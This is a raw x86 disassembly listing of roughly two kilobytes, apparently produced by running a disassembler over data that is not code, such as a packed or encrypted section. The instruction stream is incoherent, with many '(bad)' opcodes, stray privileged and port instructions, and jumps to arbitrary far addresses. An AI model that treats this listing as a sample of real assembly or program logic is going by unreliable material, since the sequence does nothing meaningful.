  4146f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146fa:	stc    
  4146fb:	sub    DWORD PTR [eax+0xfea4c4f],0x5a4ecf1c
  414705:	fstp   TBYTE PTR [ebp+0x68fa48]
  41470b:	push   cs
  41470c:	rol    DWORD PTR [ebx-0x33],1
  41470f:	xchg   ecx,eax
  414710:	outs   dx,DWORD PTR ds:[esi]
  414711:	sbb    BYTE PTR [ebp+0x4b5d679a],bh
  414717:	cs xchg dh,ch
  41471a:	fnstsw WORD PTR [edx+0x43]
  41471d:	je     0x414795
  41471f:	pop    esi
  414720:	dec    esp
  414721:	pop    ebx
  414722:	jns    0x41475e
  414724:	push   0x260e2529
  414729:	gs inc ecx
  41472b:	int    0x29
  41472d:	popf   
  41472e:	pop    ds
  41472f:	push   eax
  414730:	das    
  414731:	inc    ebx
  414732:	push   edx
  414733:	xor    BYTE PTR ds:0x5d7e0e48,0x2a
  41473a:	sub    al,BYTE PTR [edi]
  41473c:	push   eax
  41473d:	mov    DWORD PTR [edi+eiz*4-0x64],ebp
  414741:	rol    DWORD PTR [esi+0x38b1ace2],0x76
  414748:	sti    
  414749:	add    ah,BYTE PTR [edx]
  41474b:	mov    ds:0xddc220e3,eax
  414750:	gs repz sub eax,0xca24a6ef
  414757:	lea    ebx,fs:[edi]
  41475a:	xor    bl,0x8
  41475d:	or     BYTE PTR [edx+0x394a986f],ch
  414763:	popf   
  414764:	and    dh,dh
  414766:	les    ecx,FWORD PTR ds:0x91df80d8
  41476c:	retf   0x2b47
  41476f:	(bad)  
  414770:	jecxz  0x4147be
  414772:	sbb    al,BYTE PTR [ebx+0xe]
  414775:	popf   
  414776:	jg     0x4147e0
  414778:	in     al,0x3f
  41477a:	push   esp
  41477b:	pop    ebp
  41477c:	outs   dx,BYTE PTR ds:[esi]
  41477d:	xor    esi,edx
  41477f:	call   0x542b:0x21e2d487
  414786:	std    
  414787:	repz mov al,0xab
  41478a:	(bad)  
  41478b:	mov    ebp,0x70b48df5
  414790:	or     ebp,DWORD PTR [edx+0x415c3150]
  414796:	cmp    eax,0xa6d6505e
  41479b:	dec    ebx
  41479c:	fcom   QWORD PTR [edx-0x650b5545]
  4147a2:	mov    ebp,0x5f8dde5e
  4147a7:	inc    esi
  4147a8:	lock or eax,0x5239f367
  4147ae:	retf   0xcb70
  4147b1:	xchg   ecx,eax
  4147b2:	ret    
  4147b3:	rol    BYTE PTR [esi+0x5b],cl
  4147b6:	jns    0x414781
  4147b8:	fcom   QWORD PTR [edx+0x76bf7dd3]
  4147be:	xchg   ebx,eax
  4147bf:	push   esi
  4147c0:	cli    
  4147c1:	rol    DWORD PTR [ebx-0x1c],cl
  4147c4:	add    BYTE PTR [esi+0x4a78ee89],al
  4147ca:	call   0xdab08a71
  4147cf:	clc    
  4147d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d1:	lds    edx,FWORD PTR [ecx]
  4147d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d4:	dec    ecx
  4147d5:	jl     0x4147e5
  4147d7:	and    ebx,DWORD PTR [edi-0x21]
  4147da:	mov    ch,0xa3
  4147dc:	mov    edx,0x3adb7f54
  4147e1:	sbb    al,0x82
  4147e3:	xchg   edi,eax
  4147e4:	xchg   ecx,eax
  4147e5:	(bad)  
  4147e6:	mov    esi,0xb37cbc50
  4147eb:	fs dec ecx
  4147ed:	add    BYTE PTR [edi-0x46],0x1b
  4147f1:	je     0x4147e1
  4147f3:	and    eax,0x7cb25f0b
  4147f8:	nop
  4147f9:	pop    ebp
  4147fa:	jnp    0x414816
  4147fc:	jmp    0x6ca1a0eb
  414801:	add    ch,BYTE PTR [esi+ecx*1+0x49]
  414805:	dec    edi
  414806:	mov    ecx,0xa3faf0c
  41480b:	adc    eax,0xbb8de7d
  414810:	mov    bl,BYTE PTR [ebx+ebp*4-0x6c]
  414814:	push   esp
  414815:	pushf  
  414816:	jg     0x414799
  414818:	add    cl,BYTE PTR [ebx+0x7]
  41481b:	pop    eax
  41481c:	inc    edi
  41481d:	push   edx
  41481e:	inc    ecx
  41481f:	cmc    
  414820:	mov    bl,0x33
  414822:	mov    eax,0x826f4fba
  414827:	or     ecx,ebp
  414829:	mov    cl,0x6b
  41482b:	iret   
  41482c:	cmp    eax,ebx
  41482e:	push   esi
  41482f:	jnp    0x414886
  414831:	les    ebx,FWORD PTR [edi+edi*4-0x58]
  414835:	das    
  414836:	mov    dh,0xb2
  414838:	sbb    dl,BYTE PTR [edi]
  41483a:	ret    0x1a88
  41483d:	push   0x7f
  41483f:	(bad)  
  414840:	scas   eax,DWORD PTR es:[edi]
  414841:	sti    
  414842:	cwde   
  414843:	sti    
  414844:	inc    ecx
  414845:	stos   DWORD PTR es:[edi],eax
  414846:	fwait
  414847:	push   ebx
  414848:	stos   BYTE PTR es:[edi],al
  414849:	fstp   QWORD PTR [edx]
  41484b:	rol    al,1
  41484d:	sahf   
  41484e:	icebp  
  41484f:	xor    al,bh
  414851:	jne    0x414855
  414853:	cmp    ecx,0xffffffe6
  414856:	adc    al,0x9f
  414858:	shr    DWORD PTR [ebp+0x52],0xdc
  41485c:	xchg   ecx,eax
  41485d:	sub    ebx,esp
  41485f:	dec    esi
  414860:	push   edi
  414861:	add    esi,DWORD PTR ds:0x9821627e
  414867:	imul   esi,esi,0xffffff81
  41486a:	ret    0xb149
  41486d:	add    eax,0xdf8a105e
  414872:	dec    esp
  414873:	call   DWORD PTR [ebx-0x34]
  414876:	mov    BYTE PTR [edx-0x80],ch
  414879:	int3   
  41487a:	mov    bl,0x68
  41487c:	adc    edx,ebx
  41487e:	adc    eax,0x51864b5c
  414883:	adc    bh,ch
  414885:	cli    
  414886:	jle    0x414850
  414888:	push   ss
  414889:	pop    eax
  41488a:	mov    ebx,0x598de060
  41488f:	test   DWORD PTR [esi],0xe727f15e
  414895:	test   eax,0x8c0757a8
  41489a:	xor    cl,BYTE PTR [ebx+0x36]
  41489d:	mov    dh,0x12
  41489f:	test   BYTE PTR [edi-0x6a260570],0x66
  4148a6:	sub    eax,DWORD PTR [ebp+0x14]
  4148a9:	pusha  
  4148aa:	aam    0xd8
  4148ac:	aam    0xb0
  4148ae:	mov    ecx,0x2a0ae5c5
  4148b3:	shl    al,1
  4148b5:	lahf   
  4148b6:	fnstsw WORD PTR [eax]
  4148b8:	or     ch,bh
  4148ba:	mov    ebx,0xd0d80534
  4148bf:	sub    edi,esp
  4148c1:	dec    ebp
  4148c2:	jno    0x414869
  4148c4:	sub    eax,esp
  4148c6:	mov    WORD PTR [esi-0x6c257e96],ss
  4148cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cd:	mul    BYTE PTR [ecx-0x501281d1]
  4148d3:	scas   eax,DWORD PTR es:[edi]
  4148d4:	addr16 cmp al,ch
  4148d7:	loop   0x414951
  4148d9:	add    eax,0xd2c313ea
  4148de:	jmp    0xc1bf:0x15a902ce
  4148e5:	mov    cl,0xb4
  4148e7:	push   edx
  4148e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e9:	int3   
  4148ea:	jbe    0x4148cd
  4148ec:	mov    ebp,0x6135fc94
  4148f1:	xor    eax,0xf4c87989
  4148f6:	push   ebx
  4148f7:	dec    edi
  4148f8:	test   eax,0x2f41e586
  4148fd:	aaa    
  4148fe:	ins    DWORD PTR es:[edi],dx
  4148ff:	mov    dl,0x1
  414901:	xchg   ecx,eax
  414902:	push   0xe70bab93
  414907:	sbb    BYTE PTR [esi],0xde
  41490a:	sbb    ebx,edx
  41490c:	xchg   esi,eax
  41490d:	cli    
  41490e:	rcl    DWORD PTR [edx-0x44a738a9],1
  414914:	test   DWORD PTR es:[esi-0x77],edi
  414918:	fidiv  WORD PTR [ebp+0x57c5fcc7]
  41491e:	outs   dx,BYTE PTR ds:[esi]
  41491f:	int3   
  414920:	jno    0x414942
  414922:	cli    
  414923:	add    BYTE PTR [edi+eiz*8+0x25e411a3],cl
  41492a:	in     al,0x0
  41492c:	das    
  41492d:	(bad)  
  41492e:	ds dec esi
  414930:	scas   eax,DWORD PTR es:[edi]
  414931:	nop
  414932:	push   ecx
  414933:	sbb    al,0x3a
  414935:	dec    eax
  414936:	lds    ebx,FWORD PTR [edx+esi*2]
  414939:	out    dx,al
  41493a:	jge    0x4148c8
  41493c:	sbb    ebp,DWORD PTR [edx+0x16]
  41493f:	push   ds
  414940:	in     eax,dx
  414941:	fadd   st(5),st
  414943:	jge    0x4148fc
  414945:	sbb    edi,esp
  414947:	push   eax
  414948:	xor    al,0x15
  41494a:	push   es
  41494b:	lods   eax,DWORD PTR ds:[esi]
  41494c:	push   ebx
  41494d:	std    
  41494e:	mov    ebx,0xfd9f2829
  414953:	je     0x414991
  414955:	call   0xb4c07ad1
  41495a:	pop    ebx
  41495b:	add    BYTE PTR [ebx],dh
  41495d:	pop    ebx
  41495e:	retf   0x186e
  414961:	addr16 or eax,0x6eb413b4
  414967:	js     0x4149c5
  414969:	mov    al,ds:0xe35c1ba5
  41496e:	mov    ecx,0x1742a66a
  414973:	mov    ebx,0x97968d46
  414978:	out    dx,al
  414979:	pop    ecx
  41497a:	jmp    0xb66f268e
  41497f:	lea    edi,[edi-0x15]
  414982:	jno    0x4149b0
  414984:	jno    0x4149cf
  414986:	mov    eax,0xb69cd6d4
  41498b:	mov    fs,WORD PTR [ebp+esi*1+0x25]
  41498f:	fsubr  QWORD PTR [eax-0x71]
  414992:	ret    0xa577
  414995:	stos   DWORD PTR es:[edi],eax
  414996:	add    edi,DWORD PTR [ebx+0x56f1b8db]
  41499c:	push   edi
  41499d:	dec    esi
  41499e:	mov    DWORD PTR [esi+0x53706ba],ebp
  4149a4:	stos   DWORD PTR es:[edi],eax
  4149a5:	sub    BYTE PTR [ebx+edx*1-0x69],al
  4149a9:	add    al,0xa2
  4149ab:	hlt    
  4149ac:	dec    ecx
  4149ad:	int3   
  4149ae:	mov    ch,0xfb
  4149b0:	jns    0x414952
  4149b2:	loop   0x414a19
  4149b4:	hlt    
  4149b5:	out    0x62,al
  4149b7:	hlt    
  4149b8:	sbb    BYTE PTR [ecx+0x62eac31e],ah
  4149be:	call   0x4b59:0xc12ac92d
  4149c5:	mul    BYTE PTR [edx]
  4149c7:	ror    dl,0x89
  4149ca:	mov    esi,0x50af5a00
  4149cf:	or     al,0xcf
  4149d1:	sub    ah,bh
  4149d3:	sub    edi,ebx
  4149d5:	mov    esp,DWORD PTR [esi]
  4149d7:	pop    esi
  4149d8:	xor    BYTE PTR [esi],dl
  4149da:	aam    0xe0
  4149dc:	dec    esi
  4149dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149de:	mov    cl,0x3f
  4149e0:	iret   
  4149e1:	jae    0x41498b
  4149e3:	pop    ecx
  4149e4:	jbe    0x4149ca
  4149e6:	aaa    
  4149e7:	cmp    dh,BYTE PTR [edx]
  4149e9:	nop
  4149ea:	and    eax,0x1fb3ba99
  4149ef:	cdq    
  4149f0:	in     al,dx
  4149f1:	stos   BYTE PTR es:[edi],al
  4149f2:	fsubr  DWORD PTR [eiz*2-0x71e5a779]
  4149f9:	jmp    0x414a19
  4149fb:	cld    
  4149fc:	test   al,0x7c
  4149fe:	cmp    BYTE PTR [ebp-0x26],ah
  414a01:	mov    dh,0xc8
  414a03:	pop    ds
  414a04:	sub    al,0x6b
  414a06:	cld    
  414a07:	xor    ebp,DWORD PTR [edi-0x7e794964]
  414a0d:	xor    BYTE PTR [ecx],bh
  414a0f:	call   0x613ce2e2
  414a14:	cmp    al,0xf6
  414a16:	stos   BYTE PTR es:[edi],al
  414a17:	cmp    BYTE PTR [eax-0x68],al
  414a1a:	les    edx,FWORD PTR [edi]
  414a1c:	sbb    DWORD PTR [edx+0x2f],esp
  414a1f:	xchg   ebp,eax
  414a20:	cwde   
  414a21:	cmc    
  414a22:	cdq    
  414a23:	arpl   WORD PTR [edx-0x80],di
  414a26:	push   edi
  414a27:	retf   
  414a28:	seta   BYTE PTR [esi]
  414a2b:	mov    dh,0x18
  414a2d:	dec    ebx
  414a2e:	dec    ebp
  414a2f:	aaa    
  414a30:	lea    edx,[ecx-0x39a15904]
  414a36:	push   0x23e8a847
  414a3b:	ja     0x414a3a
  414a3d:	imul   ebp,edi,0x3d32c40d
  414a43:	fsub   QWORD PTR [edx-0x620707ac]
  414a49:	stos   BYTE PTR es:[edi],al
  414a4a:	xor    ecx,ebx
  414a4c:	call   0x9c93:0x247261bd
  414a53:	icebp  
  414a54:	shl    DWORD PTR [esi-0x3fef16c8],0x99
  414a5b:	xor    edx,0x67a34bf
  414a61:	push   edi
  414a62:	xor    bl,bl
  414a64:	addr16 jmp 0x414a62
  414a67:	jb     0x414aa4
  414a69:	inc    ecx
  414a6a:	and    DWORD PTR [ecx+0x29],0x8d3ddee7
  414a71:	(bad)  
  414a72:	sahf   
  414a73:	dec    ecx
  414a74:	rol    BYTE PTR [ecx-0x2c],cl
  414a77:	(bad)  
  414a78:	rcl    dh,cl
  414a7a:	imul   cl
  414a7c:	cli    
  414a7d:	out    0x7a,al
  414a7f:	add    BYTE PTR [esi],bh
  414a81:	jno    0x414a35
  414a83:	push   ds
  414a84:	inc    esp
  414a85:	mov    ah,0xe2
  414a87:	cwde   
  414a88:	jmp    0x3e49feb2
  414a8d:	pusha  
  414a8e:	lods   al,BYTE PTR ds:[esi]
  414a8f:	enter  0x6c31,0x7
  414a93:	lock aaa 
  414a95:	cmp    eax,0x2508715c
  414a9a:	cmc    
  414a9b:	inc    esi
  414a9c:	cmp    al,0xf9
  414a9e:	sahf   
  414a9f:	ss in  eax,0xbe
  414aa2:	int    0x28
  414aa4:	ins    BYTE PTR es:[edi],dx
  414aa5:	push   ebx
  414aa6:	push   ss
  414aa7:	xchg   edi,eax
  414aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa9:	fisttp DWORD PTR [ecx]
  414aab:	jnp    0x414a4d
  414aad:	rcl    BYTE PTR [ebx+0x5cd464f6],1
  414ab3:	rcr    BYTE PTR [edx],cl
  414ab5:	sbb    al,0x7
  414ab7:	push   0x7ac24a21
  414abc:	stos   BYTE PTR es:[edi],al
  414abd:	and    ah,BYTE PTR [edx]
  414abf:	outs   dx,BYTE PTR ds:[esi]
  414ac0:	mov    ebp,0x5e47a9f6
  414ac5:	jb     0x414b1c
  414ac7:	sti    
  414ac8:	and    DWORD PTR [ecx*8-0x2994ac8b],ebp
  414acf:	bswap  edi
  414ad1:	aas    
  414ad2:	in     al,dx
  414ad3:	les    eax,FWORD PTR [edi]
  414ad5:	lahf   
  414ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad7:	jecxz  0x414aca
  414ad9:	mov    dl,0x46
  414adb:	pop    ecx
  414adc:	clc    
  414add:	mov    ds:0x5b5c4293,eax
  414ae2:	and    DWORD PTR [esi+ecx*8-0x5af03dac],eax
  414ae9:	add    BYTE PTR [ecx-0x4ee5c468],cl
  414aef:	dec    ebp
  414af0:	pop    eax
  414af1:	cli    
  414af2:	pusha  
  414af3:	ins    BYTE PTR es:[edi],dx
  414af4:	push   ebp
  414af5:	ins    DWORD PTR es:[edi],dx
  414af6:	push   ss
  414af7:	adc    BYTE PTR [ebp+0x3e0b43d3],ch
  414afd:	add    dl,BYTE PTR [ecx]
  414aff:	jmp    0x321909a9
  414b04:	mov    dh,0xe1
  414b06:	jae    0x414a95
  414b08:	mov    esi,0x102af0b9
  414b0d:	dec    esp
  414b0e:	clc    
  414b0f:	mov    ds:0x90797607,al
  414b14:	and    ch,0xe8
  414b17:	jl     0x414b6a
  414b19:	jmp    0x1a13b956
  414b1e:	retf   
  414b1f:	jl     0x414af8
  414b21:	sbb    DWORD PTR [edx],eax
  414b23:	shl    BYTE PTR [esi-0x6eea15a7],cl
  414b29:	xchg   edi,eax
  414b2a:	ret    
  414b2b:	(bad)  
  414b2c:	mov    ah,0x26
  414b2e:	fdecstp 
  414b30:	and    eax,DWORD PTR [edi]
  414b32:	mov    bl,0x86
  414b34:	sbb    eax,0xd0e91b62
  414b39:	push   0x10
  414b3b:	idiv   DWORD PTR [edi]
  414b3d:	ror    DWORD PTR [ebx+0x33],0x7d
  414b41:	cmp    al,0xf
  414b43:	sahf   
  414b44:	fs dec ebp
  414b46:	ins    DWORD PTR es:[di],dx
  414b48:	in     al,0xaa
  414b4a:	inc    eax
  414b4b:	call   0x51852ac2
  414b50:	cld    
  414b51:	pop    esp
  414b52:	fmul   QWORD PTR [ecx+0x8]
  414b55:	int3   
  414b56:	sbb    ebp,DWORD PTR [ebx+0x48]
  414b59:	push   0xffffffe5
  414b5b:	dec    ebp
  414b5c:	xchg   edx,eax
  414b5d:	cmp    ch,BYTE PTR [edi-0x40]
  414b60:	mov    ebx,0x556c304a
  414b65:	bound  eax,QWORD PTR [edi-0x3c]
  414b68:	cwde   
  414b69:	adc    BYTE PTR [ebp-0x247d7cd0],0x12
  414b70:	adc    esp,ebx
  414b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b73:	dec    eax
  414b74:	(bad)  
  414b75:	adc    edi,esi
  414b77:	adc    eax,0xcd125756
  414b7c:	push   esi
  414b7d:	jbe    0x414bc2
  414b7f:	sub    eax,0x50e0ae18
  414b84:	repz repnz fwait
  414b87:	test   eax,0x8997ae9a
  414b8c:	mov    dl,BYTE PTR [ecx]
  414b8e:	movlps QWORD PTR [esi],xmm5
  414b91:	add    eax,0xca98fe35
  414b96:	pop    ecx
  414b97:	jo     0x414b88
  414b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b9a:	cmp    eax,ebx
  414b9c:	mov    al,0xea
  414b9e:	mov    bl,0xb9
  414ba0:	loop   0x414b67
  414ba2:	in     al,dx
  414ba3:	xchg   ecx,eax
  414ba4:	in     eax,dx
  414ba5:	inc    esp
  414ba6:	loopne 0x414b28
  414ba8:	inc    esp
  414ba9:	rcl    BYTE PTR [ecx+0x72],0xbc
  414bad:	pop    esp
  414bae:	aad    0xf
  414bb0:	mov    esi,DWORD PTR [eax+0x100de1a8]
  414bb6:	push   ss
  414bb7:	ins    BYTE PTR es:[edi],dx
  414bb8:	out    0x20,al
  414bba:	repz xchg ecx,eax
  414bbd:	mov    BYTE PTR [edx],dh
  414bbf:	push   ecx
  414bc0:	js     0x414b60
  414bc2:	repz sbb ch,BYTE PTR [edi]
  414bc5:	scas   al,BYTE PTR es:[edi]
  414bc6:	arpl   cx,di
  414bc8:	mov    eax,0xc4216bf4
  414bcd:	scas   al,BYTE PTR es:[edi]
  414bce:	mov    esp,0xf4fdb94
  414bd3:	(bad)  [esi-0x3eabc40]
  414bd9:	push   edx
  414bda:	lds    ebp,FWORD PTR [eax+0x7440607d]
  414be0:	fild   WORD PTR [ecx]
  414be2:	sbb    al,0x2a
  414be4:	lods   al,BYTE PTR ds:[esi]
  414be5:	outs   dx,DWORD PTR ds:[esi]
  414be6:	pop    ebx
  414be7:	lea    ebx,[edi+eax*4+0x2d18c6c]
  414bee:	xchg   edi,eax
  414bef:	dec    ebp
  414bf0:	outs   dx,DWORD PTR ds:[esi]
  414bf1:	in     eax,0x1e
  414bf3:	iret   
  414bf4:	int3   
  414bf5:	mov    esi,?
  414bf7:	mov    dl,0x1b
  414bf9:	push   edx
  414bfa:	(bad)  
  414bfb:	shl    al,0x60
  414bfe:	mov    dl,0x25
  414c00:	(bad)  
  414c02:	(bad)  
  414c03:	call   0x9e34:0x5a9d4b71
  414c0a:	sub    BYTE PTR [ecx-0x66],dl
  414c0d:	sbb    al,BYTE PTR cs:[ebp+0x35]
  414c11:	pop    esi
  414c12:	dec    edi
  414c13:	xchg   esi,eax
  414c14:	lahf   
  414c15:	and    BYTE PTR ds:0x7a2e6023,dh
  414c1b:	test   BYTE PTR [esi-0x17],bl
  414c1e:	ins    DWORD PTR es:[edi],dx
  414c1f:	fwait
  414c20:	je     0x414c98
  414c22:	es ins BYTE PTR es:[edi],dx
  414c24:	xchg   esp,eax
  414c25:	test   eax,0x5f00d2d0
  414c2a:	pop    edi
  414c2b:	xchg   edx,eax
  414c2c:	and    bh,BYTE PTR [edi+0x2e]
  414c2f:	and    al,0xaf
  414c31:	icebp  
  414c32:	adc    dh,BYTE PTR [edi+0x203a9e6b]
  414c38:	push   es
  414c39:	mov    ecx,0x9e9ea7b5
  414c3e:	sub    eax,DWORD PTR [eax+0x268e14d3]
  414c44:	lock pushf 
  414c46:	sub    bl,dh
  414c48:	inc    eax
  414c49:	push   0x1883d397
  414c4e:	clc    
  414c4f:	aad    0x67
  414c51:	int3   
  414c52:	add    BYTE PTR [ebp+ebp*8-0x1],cl
  414c56:	es dec esi
  414c58:	pusha  
  414c59:	nop
  414c5a:	inc    eax
  414c5b:	sub    BYTE PTR [ebx-0x15c4ef2a],bl
  414c61:	sbb    al,0xdd
  414c63:	sbb    eax,0x1ccc4a0e
  414c68:	cs push 0xffffffe7
  414c6b:	leave  
  414c6c:	and    eax,ebp
  414c6e:	mov    ecx,0x942a98b0
  414c73:	outs   dx,BYTE PTR ds:[esi]
  414c74:	and    eax,0xdda1ab92
  414c79:	dec    ebp
  414c7a:	inc    ebp
  414c7b:	or     BYTE PTR [edx+edx*4-0x4e],0xaa
  414c80:	popf   
  414c81:	retf   
  414c82:	cwde   
  414c83:	repnz push 0xffffffaf
  414c86:	enter  0x8f4,0x16
  414c8a:	mov    edx,gs
  414c8c:	mov    al,0xba
  414c8e:	xchg   ebp,eax
  414c8f:	(bad)  
  414c91:	xchg   edi,eax
  414c92:	cmc    
  414c93:	adc    al,0x84
  414c95:	adc    DWORD PTR [eax],ebx
  414c97:	ins    DWORD PTR es:[edi],dx
  414c98:	mov    al,ds:0x5681053
  414c9d:	inc    edi
  414c9e:	or     al,0xfc
  414ca0:	pop    edi
  414ca1:	int3   
  414ca2:	push   esi
  414ca3:	cli    
  414ca4:	and    BYTE PTR [ebx+0x291f442e],bl
  414caa:	mov    ds:0x71c91e21,al
  414caf:	and    al,0x46
  414cb1:	mov    bh,0x61
  414cb3:	mov    ds:0xd203f20d,al
  414cb8:	push   edi
  414cb9:	dec    edx
  414cba:	push   cx
  414cbc:	bound  edx,QWORD PTR [eax]
  414cbe:	mov    al,0x6f
  414cc0:	inc    eax
  414cc1:	mov    ebp,0x1abc3245
  414cc6:	adc    esp,DWORD PTR [eax+0x1d]
  414cc9:	ror    DWORD PTR [edx-0x78],0x5d
  414ccd:	mov    fs,WORD PTR [edx+ebx*2+0x7964c4a0]
  414cd4:	xchg   edx,eax
  414cd5:	sti    
  414cd6:	gs adc al,0xae
  414cd9:	mov    esp,0xc0b77920
  414cde:	adc    cl,dl
  414ce0:	mov    WORD PTR [ebx-0x2d74752d],cs
  414ce6:	push   ecx
  414ce7:	adc    edi,edi
  414ce9:	jl     0x414d14
  414ceb:	repz out 0x52,al
  414cee:	mov    edx,0x6e0a2d85
  414cf3:	pushf  
  414cf4:	dec    edi
  414cf5:	shr    DWORD PTR [ebx+0x1],0xa4
  414cf9:	add    ch,BYTE PTR [ebx]
  414cfb:	ins    BYTE PTR es:[edi],dx
  414cfc:	cdq    
  414cfd:	(bad)  
  414cfe:	push   esi
  414cff:	mov    esp,ecx
  414d01:	leave  
  414d02:	out    0x93,al
  414d04:	out    0xe3,eax
  414d06:	jmp    0x97dbccc2
  414d0b:	add    ecx,edi
  414d0d:	xchg   edx,eax
  414d0e:	or     ebp,esp
  414d10:	xchg   edx,eax
  414d11:	mov    eax,0xc3af8949
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	mov    ecx,0x84612bbb
  414d1d:	mov    WORD PTR [eax],ds
  414d1f:	jmp    0x269f:0xed91faee
  414d26:	aam    0x58
  414d28:	(bad)
  414d2b:	adc    cl,BYTE PTR [edi]
  414d2d:	dec    eax
  414d2e:	or     eax,0xd9629dea
  414d33:	jne    0x414d72
  414d35:	lock xchg edx,eax
  414d37:	scas   al,BYTE PTR es:[edi]
  414d38:	pop    ds
  414d39:	xchg   dl,ch
  414d3b:	movups XMMWORD PTR [edx-0x11],xmm4
  414d3f:	ficomp DWORD PTR [edi-0x56]
  414d42:	pop    esi
  414d43:	add    bl,BYTE PTR [ebx-0x2]
  414d46:	add    BYTE PTR [ebp-0x78140167],al
  414d4c:	pop    esi
  414d4d:	pop    ebp
  414d4e:	test   eax,0xafba50ce
  414d53:	ret    
  414d54:	pop    ebp
  414d55:	and    ebx,0x1879b7ec
  414d5b:	cmc    
  414d5c:	and    bl,BYTE PTR [edi-0x693400af]
  414d62:	pop    ebx
  414d63:	jle    0x414d7a
  414d65:	daa    
  414d66:	in     eax,0x7
  414d68:	xchg   si,ax
  414d6a:	mov    ds:0xa7a620cb,al
  414d6f:	inc    esi
  414d70:	pop    edx
  414d71:	add    esp,DWORD PTR [esi]
  414d73:	mov    esp,0x939eb342
  414d78:	pusha  
  414d79:	cld    
  414d7a:	(bad)  
  414d7b:	sbb    eax,0xa1e96d85
  414d80:	sar    edi,1
  414d82:	jb     0x414ddc
  414d84:	mov    cl,0xf0
  414d86:	dec    eax
  414d87:	dec    edx
  414d88:	xor    dh,ch
  414d8a:	jnp    0x414d4c
  414d8c:	je     0x414d13
  414d8e:	inc    ebp
  414d8f:	sub    DWORD PTR [ebx],ecx
  414d91:	inc    ebp
  414d92:	add    al,0xc3
  414d94:	mov    dl,0x23
  414d96:	ret    0xf6bd
  414d99:	imul   ebp,ebx,0xcc594ca5
  414d9f:	cwde   
  414da0:	in     al,dx
  414da1:	ret    0x993c
  414da4:	fs addr16 iretw 
  414da8:	mov    ebx,ds
  414daa:	test   BYTE PTR [ebx],bl
  414dac:	mov    DWORD PTR [edi+ebx*4-0x71],edi
  414db0:	repz and eax,0x2aa66b4f
  414db6:	ret    
  414db7:	inc    edi
  414db8:	in     al,0xf5
  414dba:	mov    edx,0x39e5550b
  414dbf:	(bad)  
  414dc1:	pop    ecx
  414dc2:	cmp    DWORD PTR [edi-0x49],ebx
  414dc5:	dec    eax
  414dc6:	mov    ds:0xdd8fd1c5,eax
  414dcb:	pop    esi
  414dcc:	add    eax,DWORD PTR [edi+ebx*1]
  414dcf:	dec    edi
  414dd0:	mov    dh,0xa
  414dd2:	cmp    edx,esp
  414dd4:	scas   eax,DWORD PTR es:[edi]
  414dd5:	lods   al,BYTE PTR ds:[esi]
  414dd6:	ret    
  414dd7:	xor    BYTE PTR [ecx+0x5c42e2d3],ah
  414ddd:	inc    ecx
  414dde:	adc    ecx,DWORD PTR [eax+0x70]
  414de1:	loope  0x414dff
  414de3:	push   ds
  414de4:	sub    ecx,edx
  414de6:	sbb    eax,0xff7c58e2
  414deb:	mov    BYTE PTR ds:0x71818cb3,dl
  414df1:	push   edx
  414df2:	shl    BYTE PTR [edx],cl
  414df4:	cld    
  414df5:	or     al,0x60
  414df7:	xchg   BYTE PTR [eax+0x8],ch
  414dfa:	xor    BYTE PTR [esi+esi*2+0x73],bh
  414dfe:	fs lahf 
  414e00:	sbb    eax,0xfa4dfca6
  414e05:	xchg   ebp,eax
  414e06:	int    0x31
  414e08:	and    BYTE PTR [edx+0x5140f68f],dh
  414e0e:	sbb    BYTE PTR [edi+0x134d71ac],ah
  414e14:	mov    eax,ds:0x6298e46
  414e19:	call   0x7d88384
  414e1e:	cs fdiv st,st(1)
  414e21:	mov    ebx,0x3c910a79
  414e26:	aaa    
  414e27:	mov    BYTE PTR ds:0xb53ff1ce,ah
  414e2d:	push   ecx
  414e2e:	sar    DWORD PTR [edx],0x3e
  414e31:	or     dh,BYTE PTR [esi]
  414e33:	sar    DWORD PTR [ebp+0x504f0eb],cl
  414e39:	js     0x414e27
  414e3b:	dec    al
  414e3d:	pop    esi
  414e3e:	stc    
  414e3f:	adc    edx,DWORD PTR [edx-0xd]
  414e42:	fsubr  QWORD PTR [ecx-0x2]
  414e45:	or     BYTE PTR [ebp+0x1bdcc0bd],dh
  414e4b:	retf   
  414e4c:	jl     0x414e50
  414e4e:	add    ebx,DWORD PTR [edx-0x6c]
  414e51:	popa   
  414e52:	mov    ds:0x3c805981,eax
  414e57:	loopne 0x414e1c
  414e59:	adc    al,0xb4
  414e5b:	pop    ebx
  414e5c:	jp     0x414eb0
  414e5e:	aam    0xb6
  414e60:	imul   esp,DWORD PTR [esi+0x1c39671e],0xffffffa9
  414e67:	(bad)  
  414e68:	xor    al,0x64
  414e6a:	iret   
  414e6b:	sub    esi,DWORD PTR [edx]
  414e6d:	setp   BYTE PTR [esi]
  414e70:	inc    edx
  414e71:	add    ebx,0x662f6788
  414e77:	imul   ebp,DWORD PTR [ecx-0x5a98240c],0x5
  414e7e:	ret    
  414e7f:	test   BYTE PTR [eax+0x5b],cl
  414e82:	fstp   QWORD PTR [edx+0x5b]
  414e85:	div    ebx
  414e87:	into   
  414e88:	mov    esi,0x22b01d8a
  414e8d:	dec    edi
  414e8e:	cmp    ah,BYTE PTR [edi+0x30bc839d]
  414e94:	add    al,0xfe
  414e96:	retf   
  414e97:	or     edi,eax
  414e99:	push   ebp
  414e9a:	(bad)  
  414e9b:	fstp   st(2)
  414e9d:	mov    bh,0x53
  414e9f:	mov    al,ds:0x73e0beab
  414ea4:	adc    ebp,esi
  414ea6:	xchg   esp,eax
  414ea7:	mov    dh,0x1
  414ea9:	sub    al,0x82
  414eab:	mov    gs,WORD PTR [eax]
  414ead:	ins    BYTE PTR es:[edi],dx
  414eae:	stos   DWORD PTR es:[edi],eax
  414eaf:	fwait
  414eb0:	xor    eax,0x9173c099
  414eb5:	xor    dh,bl
  414eb7:	rol    BYTE PTR [edi+0x4a],0xb8
